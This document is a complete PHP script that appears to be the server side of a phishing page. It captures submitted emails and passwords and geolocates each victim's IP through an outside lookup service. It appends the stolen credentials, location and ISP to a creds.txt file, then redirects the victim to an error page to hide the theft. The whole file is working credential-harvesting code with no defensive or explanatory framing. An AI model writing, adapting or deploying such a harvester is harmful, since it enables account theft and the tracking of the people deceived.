<?php
function get_ip_info($ip) {
    $url = "http://ip-api.com/json/" . $ip;
    $info = json_decode(file_get_contents($url), true);
    return $info;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"] ?? "unknown";
    $password = $_POST["pass"] ?? "unknown";
    $ip = $_SERVER["REMOTE_ADDR"];

    $info = get_ip_info($ip);
    $country = $info["country"] ?? "N/A";
    $region  = $info["regionName"] ?? "N/A";
    $city    = $info["city"] ?? "N/A";
    $isp     = $info["isp"] ?? "N/A";

    $data  = "[IP]: $ip\\n";
    $data .= "[Email]: $email\\n";
    $data .= "[Pass]: $password\\n";
    $data .= "[Location]: $city, $region, $country\\n";
    $data .= "[ISP]: $isp\\n";
    $data .= "----------------------------------------\\n\\n";

    file_put_contents("creds.txt", $data, FILE_APPEND);
    header("Location: error.html");
    exit();
}
?>
